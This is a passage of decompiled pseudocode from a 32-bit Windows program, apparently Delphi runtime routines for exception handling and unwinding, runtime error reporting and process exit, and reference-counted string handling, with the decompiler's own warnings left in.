  ExceptionRecord = ExceptionInfo.ExceptionRecord;
  if ( (ExceptionInfo.ExceptionRecord->ExceptionFlags & 6) != 0 )
    return 1;
  v7 = ExceptionInfo.ExceptionRecord->ExceptionInformation[1];
  ExceptionAddress = (PVOID)ExceptionInfo.ExceptionRecord->ExceptionInformation[0];
  if ( ExceptionInfo.ExceptionRecord->ExceptionCode != 250477278 )
  {
    sub_402B4C();
    if ( !dword_41E00C )
      return 1;
    v9 = dword_41E00C();
    if ( !v9 )
      return 1;
    if ( ExceptionInfo.ExceptionRecord->ExceptionCode != 250608334 )
    {
      sub_402D68(v9, a6);
      if ( byte_41C00C )
      {
        if ( !byte_41C008 )
        {
          v18 = (EXCEPTION_RECORD *)v9;
          if ( UnhandledExceptionFilter(&ExceptionInfo) )
          {
            v7 = (ULONG_PTR)v18;
            ExceptionRecord = ExceptionInfo.ExceptionRecord;
            ExceptionAddress = ExceptionInfo.ExceptionRecord->ExceptionAddress;
            goto LABEL_14;
          }
          return 1;
        }
      }
    }
    v7 = v9;
    ExceptionRecord = ExceptionInfo.ExceptionRecord;
    ExceptionAddress = ExceptionInfo.ExceptionRecord->ExceptionAddress;
  }
  if ( (unsigned __int8)byte_41C00C <= 1u
    || byte_41C008
    || (v18 = ExceptionRecord,
        v17 = v7,
        v16 = ExceptionAddress,
        v10 = UnhandledExceptionFilter(&ExceptionInfo) == 0,
        ExceptionAddress = v16,
        v7 = v17,
        ExceptionRecord = v18,
        !v10) )
  {
LABEL_14:
    ExceptionRecord->ExceptionFlags |= 2u;
    v18 = a1;
    v17 = a4;
    v16 = a3;
    v15[5] = a2;
    v15[4] = NtCurrentTeb()->NtTib.ExceptionList;
    v15[3] = ExceptionRecord;
    v15[2] = v7;
    v15[1] = ExceptionAddress;
    RtlUnwind(ExceptionInfo.ContextRecord, &loc_402F0B, ExceptionRecord, 0);
    ContextRecord = ExceptionInfo.ContextRecord;
    v12 = sub_4059F0();
    v15[0] = *v12;
    *v12 = v15;
    Dr0 = ContextRecord->Dr0;
    ContextRecord->Dr0 = (DWORD)&loc_402F37;
    Dr0 += 5;
    sub_402D9C(Dr0, (ULONG_PTR)v12);
    __asm { jmp     ebx }
  }
  return 1;
}
// 402E9C: variable 'v9' is possibly undefined
// 41C008: using guessed type char byte_41C008;
// 41C00C: using guessed type char byte_41C00C;
// 41E00C: using guessed type int (*dword_41E00C)(void);

//----- (00402F60) --------------------------------------------------------
int __cdecl sub_402F60(int a1, ULONG_PTR a2)
{
  int v2; // ecx
  void (*v3)(void); // ecx

  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    v2 = *(_DWORD *)(a2 + 4);
    *(_DWORD *)(a2 + 4) = &loc_402F90;
    sub_402DD0(v2 + 5, a2, a1);
    v3();
  }
  return 1;
}
// 402F8A: variable 'v3' is possibly undefined

//----- (00402F98) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __stdcall sub_402F98(DWORD a1, DWORD a2, DWORD a3, const ULONG_PTR *a4)
{
  RaiseException(a1, a2, a3, a4);
}
// 402F99: positive sp value 4 has been found

//----- (00402FB4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __cdecl sub_402FB4(int a1, int a2)
{
  _DWORD **v2; // eax
  _DWORD *v3; // edx
  _DWORD *v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD **v6; // [esp-14h] [ebp-14h]

  *(_DWORD *)(a2 + 4) = &loc_402FFF;
  v2 = (_DWORD **)sub_4059F0();
  v3 = *v2;
  *v2 = (_DWORD *)**v2;
  v4 = (_DWORD *)v3[3];
  v4[1] &= ~2u;
  if ( *v4 != 250477278 )
  {
    sub_402BDC((_DWORD *)v3[2]);
    sub_402D4C();
  }
  *v6 = NtCurrentTeb()->NtTib.ExceptionList->Next;
  return 1;
}
// 402FFF: positive sp value 28 has been found
// 402FB4: could not find valid save-restore pair for ebx
// 402FB4: could not find valid save-restore pair for ebp
// 402FB4: could not find valid save-restore pair for edi
// 402FB4: could not find valid save-restore pair for esi
// 402FF9: variable 'v6' is possibly undefined

//----- (00403008) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_403008(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12)
{
  _DWORD **v12; // eax
  _DWORD *v13; // edx
  unsigned int v15; // [esp-10h] [ebp-10h]
  ULONG_PTR v16; // [esp-4h] [ebp-4h]

  v12 = (_DWORD **)sub_4059F0();
  v13 = *v12;
  *v12 = (_DWORD *)**v12;
  sub_402BDC((_DWORD *)v13[2]);
  __writefsdword(0, v15);
  sub_402DF8(v15, v16);
  __asm { jmp     edx }
}
// 403024: positive sp value 4 has been found
// 403035: unbalanced stack, ignored a potential tail call
// 40302B: variable 'v15' is possibly undefined
// 403030: variable 'v16' is possibly undefined

//----- (00403038) --------------------------------------------------------
int __stdcall sub_403038(unsigned int a1, int a2, int a3)
{
  __writefsdword(0, a1);
  return ((int (*)(void))(a2 + 5))();
}

//----- (00403050) --------------------------------------------------------
void __usercall __noreturn sub_403050(int a1@<eax>)
{
  sub_4034BC(a1);
}

//----- (0040305C) --------------------------------------------------------
void __stdcall __noreturn sub_40305C(int *a1)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  unsigned int v4; // eax
  bool v5; // cf
  unsigned int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  unsigned __int8 v10; // al

  v1 = *a1;
  if ( *a1 > -1073741678 )
  {
    if ( v1 > -1073741674 )
    {
      v9 = v1 + 1073741571;
      if ( !v9 )
      {
        v10 = -54;
        goto LABEL_33;
      }
      if ( v9 == 61 )
      {
        v10 = -39;
        goto LABEL_33;
      }
    }
    else
    {
      if ( v1 == -1073741674 )
      {
        v10 = -38;
        goto LABEL_33;
      }
      v7 = v1 + 1073741677;
      if ( !v7 )
        goto LABEL_27;
      v8 = v7 - 1;
      if ( !v8 )
      {
        v10 = -56;
        goto LABEL_33;
      }
      if ( v8 == 1 )
      {
        v10 = -41;
        goto LABEL_33;
      }
    }
  }
  else
  {
    if ( *a1 == -1073741678 )
      goto LABEL_24;
    if ( v1 <= -1073741682 )
    {
      if ( v1 == -1073741682 )
      {
        v10 = -56;
        goto LABEL_33;
      }
      v2 = v1 + 1073741819;
      if ( !v2 )
      {
        v10 = -40;
        goto LABEL_33;
      }
      v3 = v2 - 135;
      if ( !v3 )
      {
        v10 = -55;
        goto LABEL_33;
      }
      if ( v3 != 1 )
        goto LABEL_32;
LABEL_27:
      v10 = -50;
      goto LABEL_33;
    }
    v4 = v1 + 1073741681;
    v5 = v4 < 2;
    v6 = v4 - 2;
    if ( v5 )
    {
LABEL_24:
      v10 = -49;
      goto LABEL_33;
    }
    if ( !v6 )
    {
      v10 = -51;
      goto LABEL_33;
    }
  }
LABEL_32:
  v10 = -1;
LABEL_33:
  sub_403050(v10);
}

//----- (004030FC) --------------------------------------------------------
int __cdecl sub_4030FC(struct _EXCEPTION_POINTERS ExceptionInfo)
{
  PEXCEPTION_RECORD v1; // eax
  PEXCEPTION_RECORD ExceptionRecord; // ebx
  ULONG_PTR ExceptionAddress; // edx
  ULONG_PTR v4; // eax
  ULONG_PTR retaddr; // [esp+0h] [ebp+0h]

  if ( (ExceptionInfo.ExceptionRecord->ExceptionFlags & 6) == 0
    && (byte_41C008 || UnhandledExceptionFilter(&ExceptionInfo)) )
  {
    sub_402B4C();
    RtlUnwind(ExceptionInfo.ContextRecord, &loc_403141, v1, 0);
    ExceptionRecord = ExceptionInfo.ExceptionRecord;
    ExceptionAddress = ExceptionInfo.ExceptionRecord->ExceptionInformation[0];
    v4 = ExceptionInfo.ExceptionRecord->ExceptionInformation[1];
    if ( ExceptionInfo.ExceptionRecord->ExceptionCode != 250477278 )
    {
      if ( !dword_41E00C || (v4 = dword_41E00C()) == 0 )
        JUMPOUT(0x40305C);
      ExceptionAddress = (ULONG_PTR)ExceptionRecord->ExceptionAddress;
    }
    sub_402E14(v4, ExceptionAddress);
    if ( dword_41E000 )
      dword_41E000();
    retaddr = ExceptionInfo.ExceptionRecord->ExceptionInformation[0];
    sub_4034BC(217);
  }
  return 0;
}
// 40315B: control flows out of bounds to 40305C
// 40313C: variable 'v1' is possibly undefined
// 41C008: using guessed type char byte_41C008;
// 41E000: using guessed type int (*dword_41E000)(void);
// 41E00C: using guessed type int (*dword_41E00C)(void);

//----- (00403198) --------------------------------------------------------
PEXCEPTION_ROUTINE *__usercall sub_403198@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<ebp>)
{
  PEXCEPTION_ROUTINE *result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // ecx

  result = &a1[-2].Handler;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&a1[-2].Handler);
  *result = (PEXCEPTION_ROUTINE)ExceptionList;
  result[1] = (PEXCEPTION_ROUTINE)sub_4030FC;
  result[2] = (PEXCEPTION_ROUTINE)a1;
  dword_41E4A0 = (int)&a1[-2].Handler;
  return result;
}
// 41E4A0: using guessed type int dword_41E4A0;

//----- (004031B8) --------------------------------------------------------
int sub_4031B8()
{
  int result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // ecx

  result = dword_41E4A0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  if ( (struct _EXCEPTION_REGISTRATION_RECORD *)dword_41E4A0 == ExceptionList )
  {
    result = *(_DWORD *)dword_41E4A0;
    __writefsdword(0, *(_DWORD *)dword_41E4A0);
  }
  else
  {
    while ( ExceptionList != (struct _EXCEPTION_REGISTRATION_RECORD *)-1 )
    {
      if ( ExceptionList->Next == (struct _EXCEPTION_REGISTRATION_RECORD *)dword_41E4A0 )
      {
        result = *(_DWORD *)dword_41E4A0;
        ExceptionList->Next = *(struct _EXCEPTION_REGISTRATION_RECORD **)dword_41E4A0;
        return result;
      }
      ExceptionList = ExceptionList->Next;
    }
  }
  return result;
}
// 41E4A0: using guessed type int dword_41E4A0;

//----- (004031E0) --------------------------------------------------------
int sub_4031E0()
{
  int result; // eax
  int v1; // ebx
  int v2; // esi
  void (__cdecl *v3)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *); // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v5; // [esp-8h] [ebp-14h]
  int *v6; // [esp-4h] [ebp-10h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  result = (int)*(&dword_41E49C + 2);
  if ( result )
  {
    v1 = (int)*(&dword_41E49C + 3);
    v2 = *(_DWORD *)(result + 4);
    v6 = &savedregs;
    v5 = &loc_403226;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    while ( v1 > 0 )
    {
      *(&dword_41E49C + 3) = (const void *)--v1;
      v3 = *(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(v2 + 8 * v1 + 4);
      if ( v3 )
        v3(ExceptionList, v5, v6);
    }
    result = 0;
    __writefsdword(0, (unsigned int)ExceptionList);
  }
  return result;
}
// 41E49C: using guessed type const void *dword_41E49C;

//----- (00403240) --------------------------------------------------------
int sub_403240()
{
  int result; // eax
  int v1; // esi
  int v2; // ebx
  int v3; // edi
  void (*v4)(void); // eax
  unsigned int v5[6]; // [esp-Ch] [ebp-18h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  result = dword_41E4A4;
  if ( dword_41E4A4 )
  {
    v1 = *(_DWORD *)dword_41E4A4;
    v2 = 0;
    v3 = *(_DWORD *)(dword_41E4A4 + 4);
    v5[2] = (unsigned int)&savedregs;
    v5[1] = (unsigned int)&loc_403286;
    v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    if ( v1 > 0 )
    {
      do
      {
        v4 = *(void (**)(void))(v3 + 8 * v2++);
        dword_41E4A8 = v2;
        if ( v4 )
          v4();
      }
      while ( v1 > v2 );
    }
    result = 0;
    __writefsdword(0, v5[0]);
  }
  return result;
}
// 41E4A4: using guessed type int dword_41E4A4;
// 41E4A8: using guessed type int dword_41E4A8;

//----- (004032A0) --------------------------------------------------------
int __usercall sub_4032A0@<eax>(int a1@<eax>, int a2@<edx>, struct _EXCEPTION_REGISTRATION_RECORD *a3@<ebp>)
{
  dword_41E4A4 = a1;
  dword_41E4A8 = 0;
  dword_41E4AC = a2;
  dword_41E01C = *(_DWORD *)(a2 + 4);
  sub_403198(a3);
  byte_41E024 = 0;
  return sub_403240();
}
// 41E01C: using guessed type int dword_41E01C;
// 41E024: using guessed type char byte_41E024;
// 41E4A4: using guessed type int dword_41E4A4;
// 41E4A8: using guessed type int dword_41E4A8;
// 41E4AC: using guessed type int dword_41E4AC;

//----- (004032D0) --------------------------------------------------------
int **__usercall sub_4032D0@<eax>(_DWORD *a1@<eax>)
{
  int v1; // ebx
  char ***v2; // esi
  int **result; // eax

  v1 = *a1;
  v2 = (char ***)(a1 + 1);
  do
  {
    result = sub_404B80((int **)*v2[1], *v2);
    v2 += 2;
    --v1;
  }
  while ( v1 );
  return result;
}

//----- (004032EC) --------------------------------------------------------
int __usercall sub_4032EC@<eax>(int *a1@<eax>)
{
  int v1; // ebx
  int *v2; // esi
  int result; // eax

  v1 = *a1;
  v2 = a1 + 1;
  do
  {
    result = v2[2] + *(_DWORD *)v2[1];
    *(_DWORD *)*v2 = result;
    v2 += 3;
    --v1;
  }
  while ( v1 );
  return result;
}

//----- (0040330C) --------------------------------------------------------
unsigned int sub_40330C()
{
  unsigned int v0; // eax
  char *v1; // ebx
  unsigned int v2; // et2
  unsigned int result; // eax
  char *v4; // ebx

  v0 = dword_41E030;
  v1 = aAt00000000;
  do
  {
    v2 = v0 % 0xA;
    v0 /= 0xAu;
    *v1-- = v2 + 48;
  }
  while ( v0 );
  result = dword_41E038 - (_DWORD)sub_404610((const void *)dword_41E038);
  v4 = &aAt00000000[12];
  do
  {
    *v4-- = byte_41C050[result & 0xF];
    result >>= 4;
  }
  while ( result );
  return result;
}
// 41E030: using guessed type int dword_41E030;
// 41E038: using guessed type int dword_41E038;

//----- (0040335C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
BOOL __stdcall sub_40335C(int a1, int a2, int a3)
{
  qmemcpy(&dword_41E49C, dword_41E49C, 0x2Cu);
  return _InterlockedExchange(&dword_41E030, 0) == 0;
}
// 40338C: positive sp value 4 has been found
// 40335C: could not find valid save-restore pair for ebp
// 40335C: could not find valid save-restore pair for edi
// 40335C: could not find valid save-restore pair for esi
// 41E030: using guessed type int dword_41E030;
// 41E49C: using guessed type const void *dword_41E49C;

//----- (00403390) --------------------------------------------------------
void __noreturn sub_403390()
{
  void (*v0)(void); // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v3; // eax
  int v4; // [esp+0h] [ebp-10h]
  int v5; // [esp+4h] [ebp-Ch]
  int *v6; // [esp+8h] [ebp-8h]

  if ( !*((_BYTE *)&dword_41E49C + 36) && unk_41E034 )
  {
    do
    {
      v0 = (void (*)(void))unk_41E034;
      unk_41E034 = 0;
      v0();
    }
    while ( unk_41E034 );
  }
  if ( dword_41E038 )
  {
    sub_40330C();
    if ( byte_41E040 )
    {
      v1 = sub_40528C(dword_41E214, Text);
      sub_40520F(v1);
    }
    else if ( !byte_41C010 )
    {
      MessageBoxA(0, Text, Caption, 0);
    }
    dword_41E038 = 0;
  }
  while ( 1 )
  {
    if ( *((_BYTE *)&dword_41E49C + 36) == 2 && !dword_41E030 )
      *(&dword_41E49C + 3) = 0;
    sub_4031E0();
    if ( *((_BYTE *)&dword_41E49C + 36) <= 1u || dword_41E030 )
    {
      v2 = *(&dword_41E49C + 4);
      if ( v2 )
      {
        sub_404B10(v2);
        v3 = (int)*(&dword_41E49C + 4);
        if ( *(_DWORD *)(v3 + 16) != *(_DWORD *)(v3 + 4) )
          FreeLibrary(*(HMODULE *)(v3 + 16));
      }
    }
    sub_4031B8();
    if ( *((_BYTE *)&dword_41E49C + 36) == 1 )
      ((void (*)(void))*(&dword_41E49C + 10))();
    if ( *((_BYTE *)&dword_41E49C + 36) )
      sub_40335C(v4, v5, (int)v6);
    if ( !dword_41E49C )
      ExitProcess(dword_41E030);
    v6 = &dword_41E030;
    qmemcpy(&dword_41E49C, dword_41E49C, 0x2Cu);
  }
}
// 403460: variable 'v4' is possibly undefined
// 403460: variable 'v5' is possibly undefined
// 403460: variable 'v6' is possibly undefined
// 41C010: using guessed type char byte_41C010;
// 41E030: using guessed type int dword_41E030;
// 41E038: using guessed type int dword_41E038;
// 41E040: using guessed type char byte_41E040;
// 41E214: using guessed type _DWORD dword_41E214[115];
// 41E49C: using guessed type const void *dword_41E49C;

//----- (004034B0) --------------------------------------------------------
void __usercall __noreturn sub_4034B0(int a1@<eax>)
{
  dword_41E030 = a1;
  sub_403390();
}
// 41E030: using guessed type int dword_41E030;

//----- (004034BC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall __noreturn sub_4034BC(int a1@<eax>)
{
  int v1; // [esp-4h] [ebp-4h]

  dword_41E038 = v1;
  sub_4034B0(a1);
}
// 4034C2: positive sp value 4 has been found
// 4034BC: variable 'v1' is possibly undefined
// 41E038: using guessed type int dword_41E038;

//----- (004034C8) --------------------------------------------------------
_DWORD *__usercall sub_4034C8@<eax>(_DWORD *result@<eax>)
{
  int v1; // edx
  _DWORD *v2; // [esp-4h] [ebp-4h]

  v1 = *result;
  if ( *result )
  {
    *result = 0;
    if ( *(int *)(v1 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v1 - 8)) )
    {
      v2 = result;
      sub_4025B0(v1 - 8);
      return v2;
    }
  }
  return result;
}

//----- (004034EC) --------------------------------------------------------
int __usercall sub_4034EC@<eax>(int result@<eax>, int a2@<edx>)
{
  int *v2; // ebx
  int v4; // edx

  v2 = (int *)result;
  do
  {
    v4 = *v2;
    if ( *v2 )
    {
      *v2 = 0;
      if ( *(int *)(v4 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v4 - 8)) )
        result = sub_4025B0(v4 - 8);
    }
    ++v2;
    --a2;
  }
  while ( a2 );
  return result;
}

//----- (0040351C) --------------------------------------------------------
volatile __int32 *__usercall sub_40351C@<eax>(volatile __int32 *result@<eax>, __int32 a2@<edx>)
{
  char *v2; // edx
  char *v3; // eax
  __int32 v4; // edx
  __int32 v5; // [esp-8h] [ebp-8h]
  __int32 v6; // [esp-8h] [ebp-8h]
  volatile __int32 *v7; // [esp-4h] [ebp-4h]

  if ( a2 )
  {
    if ( (*(_DWORD *)(a2 - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(a2 - 8)) | (*(_DWORD *)(a2 - 8) == -1) )
    {
      v7 = result;
      v5 = a2;
      v2 = (char *)sub_40358C(*(_DWORD *)(a2 - 4));
      v3 = (char *)v5;
      v6 = (__int32)v2;
      sub_4026B0(v3, v2, *((_DWORD *)v3 - 1));
      a2 = v6;
      result = v7;
    }
    else
    {
      _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
    }
  }
  v4 = _InterlockedExchange(result, a2);
  if ( v4 && *(int *)(v4 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v4 - 8)) )
    return (volatile __int32 *)sub_4025B0(v4 - 8);
  return result;
}

//----- (00403560) --------------------------------------------------------
volatile __int32 *__usercall sub_403560@<eax>(volatile __int32 *result@<eax>, __int32 a2@<edx>)
{
  __int32 v2; // edx

  if ( a2 && !((*(_DWORD *)(a2 - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(a2 - 8)) | (*(_DWORD *)(a2 - 8) == -1)) )
    _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
  v2 = _InterlockedExchange(result, a2);
  if ( v2 && *(int *)(v2 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v2 - 8)) )
    return (volatile __int32 *)sub_4025B0(v2 - 8);
  return result;
}

//----- (0040358C) --------------------------------------------------------
int __usercall sub_40358C@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 <= 0 )
    return 0;
  result = sub_402598(a1 + 9) + 8;
  *(_DWORD *)(result - 4) = a1;
  *(_DWORD *)(result - 8) = 1;
  *(_BYTE *)(result + a1) = 0;
  return result;
}

//----- (004035B0) --------------------------------------------------------
_DWORD *__usercall sub_4035B0@<eax>(char **a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  char *v6; // eax
  int v7; // ecx
  char *v8; // edi
  _DWORD *result; // eax

  v6 = (char *)sub_40358C(a3);
  v7 = a3;
  v8 = v6;
  if ( a2 )
    sub_4026B0(a2, v6, v7);
  result = sub_4034C8(a1);
  *a1 = v8;
  return result;
}

//----- (004035E0) --------------------------------------------------------
_DWORD *__usercall sub_4035E0@<eax>(int cchWideChar@<ecx>, LPCWCH lpWideCharStr@<edx>, char **a3@<eax>)
{
  int v7; // esi
  int v8; // esi
  CHAR MultiByteStr[2064]; // [esp+0h] [ebp-810h] BYREF

  if ( cchWideChar <= 0 )
    return sub_4034C8(a3);
  if ( cchWideChar < 1024 )
  {
    v7 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, MultiByteStr, 2048, 0, 0);
    if ( v7 > 0 )
      return sub_4035B0(a3, MultiByteStr, v7);
  }
  v8 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, 0, 0, 0, 0);
  sub_4035B0(a3, 0, v8);
  return (_DWORD *)WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, *a3, v8, 0, 0);
}

//----- (00403670) --------------------------------------------------------
_DWORD *__usercall sub_403670@<eax>(char **a1@<eax>)
{
  char v2; // [esp-4h] [ebp-4h] BYREF

  return sub_4035B0(a1, &v2, 1);
}

//----- (00403680) --------------------------------------------------------
_DWORD *__usercall sub_403680@<eax>(char **a1@<eax>, char *a2@<edx>)
{
  int v2; // ecx
  char *v3; // ecx
  char *v5; // [esp-4h] [ebp-4h]

  v2 = 0;
  if ( a2 )
  {
    v5 = a2;
    while ( *a2 )
    {
      if ( !a2[1] )
        goto LABEL_10;
      if ( !a2[2] )
        goto LABEL_9;
      if ( !a2[3] )
      {
        ++a2;
LABEL_9:
        ++a2;
LABEL_10:
        ++a2;
        break;
      }
      a2 += 4;
    }
    v3 = a2;
    a2 = v5;
    v2 = v3 - v5;
  }
  return sub_4035B0(a1, a2, v2);
}

//----- (004036B0) --------------------------------------------------------
_DWORD *__usercall sub_4036B0@<eax>(char **a1@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v3; // ecx
  int v5; // [esp-4h] [ebp-4h]

  v2 = 0;
  if ( a2 )
  {
    v5 = a2;
    while ( *(_WORD *)a2 )
    {
      if ( !*(_WORD *)(a2 + 2) )
        goto LABEL_10;
      if ( !*(_WORD *)(a2 + 4) )
        goto LABEL_9;
      if ( !*(_WORD *)(a2 + 6) )
      {
        a2 += 2;
LABEL_9:
        a2 += 2;
LABEL_10:
        a2 += 2;
        break;
      }
      a2 += 8;
    }
    v3 = a2;
    a2 = v5;
    v2 = (unsigned int)(v3 - v5) >> 1;
  }
  return sub_4035E0(v2, (LPCWCH)a2, a1);
}

//----- (004036EC) --------------------------------------------------------
_DWORD *__usercall sub_4036EC@<eax>(char **a1@<eax>, char *a2@<edx>)
{
  return sub_4035B0(a1, a2 + 1, (unsigned __int8)*a2);
}

//----- (004036F8) --------------------------------------------------------
_DWORD *__usercall sub_4036F8@<eax>(char **a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  char *v3; // edi
  bool v4; // zf
  int v6; // [esp-8h] [ebp-Ch]

  v6 = a3;
  v3 = a2;
  v4 = 1;
  do
  {
    if ( !a3 )
      break;
    v4 = *v3++ == 0;
    --a3;
  }
  while ( !v4 );
  if ( v4 )
    a3 = ~a3;
  return sub_4035B0(a1, a2, v6 + a3);
}

//----- (00403710) --------------------------------------------------------
_DWORD *__usercall sub_403710@<eax>(char **a1@<eax>, const WCHAR *a2@<edx>)
{
  int v2; // ecx

  v2 = 0;
  if ( a2 )
    v2 = *((_DWORD *)a2 - 1) >> 1;
  return sub_4035E0(v2, a2, a1);
}

//----- (00403724) --------------------------------------------------------
int __usercall sub_403724@<eax>(int result@<eax>)
{
  if ( result )
    return *(_DWORD *)(result - 4);
  return result;
}

//----- (0040372C) --------------------------------------------------------
char **__usercall sub_40372C@<eax>(char **result@<eax>, __int32 a2@<edx>)
{
  char *v2; // ecx
  char **v3; // ebx
  int v5; // edi
  int v6; // edx
  char *v7; // eax
  int v8; // ecx

  if ( a2 )
  {
    v2 = *result;
    if ( *result )
    {
      v3 = result;
      v5 = *((_DWORD *)v2 - 1);
      v6 = v5 + *(_DWORD *)(a2 - 4);
      if ( (char *)a2 == v2 )
      {
        sub_4039FC(result, v6);
        v7 = *v3;
        v8 = v5;
      }
      else
      {
        sub_4039FC(result, v6);
        v7 = (char *)a2;
        v8 = *(_DWORD *)(a2 - 4);
      }
      return (char **)sub_4026B0(v7, &(*v3)[v5], v8);
    }
    else
    {
      return (char **)sub_40351C((volatile __int32 *)result, a2);
    }
  }
  return result;
}

//----- (00403770) --------------------------------------------------------
volatile __int32 *__usercall sub_403770@<eax>(volatile __int32 *a1@<eax>, char *a2@<edx>, char *a3@<ecx>)
{
  char *v6; // edi

  if ( !a2 )
    return sub_40351C(a1, (__int32)a3);
  if ( !a3 )
    return sub_40351C(a1, (__int32)a2);
  if ( a2 == *(char **)a1 )
    return (volatile __int32 *)sub_40372C((char **)a1, (__int32)a3);
  if ( a3 == *(char **)a1 )
  {
    v6 = (char *)sub_40358C(*((_DWORD *)a3 - 1) + *((_DWORD *)a2 - 1));
    sub_4026B0(a2, v6, *((_DWORD *)a2 - 1));
    sub_4026B0(a3, &v6[*((_DWORD *)a2 - 1)], *((_DWORD *)a3 - 1));
    if ( v6 )
      --*((_DWORD *)v6 - 2);
    return sub_40351C(a1, (__int32)v6);
  }
  else
  {
    sub_40351C(a1, (__int32)a2);
    return (volatile __int32 *)sub_40372C((char **)a1, (__int32)a3);
  }
}

//----- (004037E4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
volatile __int32 *__usercall sub_4037E4@<eax>(volatile __int32 *a1@<eax>, int a2@<edx>)
{
  int v2; // ebx
  int v3; // eax
  int v4; // ecx
  char *v5; // esi
  char *v6; // eax
  char *v7; // edx
  int v8; // ecx
  __int32 v10; // [esp-10h] [ebp-18h]
  int v12; // [esp+4h] [ebp-4h]

  v2 = a2;
  v3 = 0;
  do
  {
    v4 = *(&v12 + a2);
    if ( v4 )
      v3 += *(_DWORD *)(v4 - 4);
    --a2;
  }
  while ( a2 );
  v10 = sub_40358C(v3);
  v5 = (char *)v10;
  do
  {
    v6 = (char *)*(&v12 + v2);
    v7 = v5;
    if ( v6 )
    {
      v8 = *((_DWORD *)v6 - 1);
      v5 += v8;
      sub_4026B0(v6, v7, v8);
    }
    --v2;
  }
  while ( v2 );
  if ( v10 )
    --*(_DWORD *)(v10 - 8);
  return sub_40351C(a1, v10);
}
// 40382B: positive sp value 4 has been found

//----- (00403834) --------------------------------------------------------
int __usercall sub_403834@<eax>(int result@<eax>, int *a2@<edx>)
{
  int *v2; // esi
  int *v3; // edi
  unsigned int v4; // eax
  unsigned int v5; // edx
  bool v6; // cc
  unsigned int v7; // edx
  unsigned int v8; // edx
  int v9; // ecx
  int v10; // ebx
  char v11; // [esp-4h] [ebp-10h]

  v2 = (int *)result;
  v3 = a2;
  if ( (int *)result != a2 )
  {
    if ( result )
    {
      if ( a2 )
      {
        v4 = *(_DWORD *)(result - 4);
        v5 = *(a2 - 1);
        v6 = v4 <= v5;
        result = v4 - v5;
        if ( v6 )
          v5 += result;
        v11 = v5;
        v7 = v5 >> 2;
        if ( v7 )
        {
          while ( *v2 == *v3 )
          {
            v8 = v7 - 1;
            if ( !v8 )
            {
              ++v2;
              ++v3;
              goto LABEL_13;
            }
            if ( v2[1] != v3[1] )
              return result;
            v2 += 2;
            v3 += 2;
            v7 = v8 - 1;
            if ( !v7 )
              goto LABEL_13;
          }
        }
        else
        {
LABEL_13:
          if ( (v11 & 3) == 0
            || (v9 = *v2, v10 = *v3, (unsigned __int8)*v2 == (unsigned __int8)*v3)
            && ((v11 & 3) == 1 || BYTE1(v9) == BYTE1(v10) && ((v11 & 3) == 2 || (v9 & 0xFF0000) == (v10 & 0xFF0000))) )
          {
            result *= 2;
          }
        }
      }
      else
      {
        return *(_DWORD *)(result - 4);
      }
    }
    else
    {
      return -*(a2 - 1);
    }
  }
  return result;
}

//----- (004038D8) --------------------------------------------------------
int __usercall sub_4038D8@<eax>(int result@<eax>)
{
  if ( result )
  {
    if ( !((*(_DWORD *)(result - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(result - 8)) | (*(_DWORD *)(result - 8) == -1)) )
      _InterlockedIncrement((volatile signed __int32 *)(result - 8));
  }
  return result;
}

//----- (004038E8) --------------------------------------------------------
char *__usercall sub_4038E8@<eax>(char *result@<eax>)
{
  if ( !result )
    return &byte_4038ED;
  return result;
}
// 4038ED: using guessed type char byte_4038ED;

//----- (004038F4) --------------------------------------------------------
char *__usercall sub_4038F4@<eax>(char **a1@<eax>)
{
  char *v1; // edx
  char *v3; // edx
  char *v4; // eax

  v1 = *a1;
  if ( *a1 && *((_DWORD *)v1 - 2) != 1 )
  {
    v3 = (char *)sub_40358C(*((_DWORD *)v1 - 1));
    v4 = *a1;
    *a1 = v3;
    if ( *((int *)v4 - 2) >= 1 )
